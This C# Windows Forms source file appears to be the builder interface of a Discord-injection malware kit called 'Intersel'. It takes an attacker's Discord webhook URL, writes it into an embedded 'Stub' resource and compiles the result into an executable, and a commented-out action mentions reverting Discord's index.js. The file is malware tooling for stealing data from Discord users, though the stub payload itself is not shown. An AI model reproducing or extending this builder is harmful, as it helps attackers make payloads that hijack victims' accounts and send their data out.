using AsteroidLLC_client.Properties;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace AsteroidLLC_client
{
    public partial class Form3 : Form
    {
        public Form3()
        {
            InitializeComponent();
        }

        private void guna2GradientButton1_Click(object sender, EventArgs e)
        {
            string interselinj = Resources.Stub;
            string webhook = webhookurl.Text;

            string updtwebhook = webhook.Replace("https://discord.com/api/webhooks/", "");
            string intinjection = interselinj.Replace("intersel-webhook", updtwebhook);


            // Compile 'intinjection'

            using (SaveFileDialog saveFile = new SaveFileDialog())
            {
                saveFile.Filter = "Executable (*.exe)|*.exe";
                if (saveFile.ShowDialog() == DialogResult.OK)
                {
                    new Compiler(intinjection, saveFile.FileName);
                }
            }
        }

        private void guildBox_TextChanged(object sender, EventArgs e)
        {

        }

        private void Form3_Load(object sender, EventArgs e)
        {

        }

        private void guna2GradientButton2_Click(object sender, EventArgs e)
        {
            // revert Discord's index.js
            //RevertStub.RS();
            //MessageBox.Show("Stub has been reverted successfully!", "Intersel - version 1.0");
            new Form4().Show();
        }

        private void guna2GradientButton3_Click(object sender, EventArgs e)
        {
            new Form4().Show();
        }
    }
}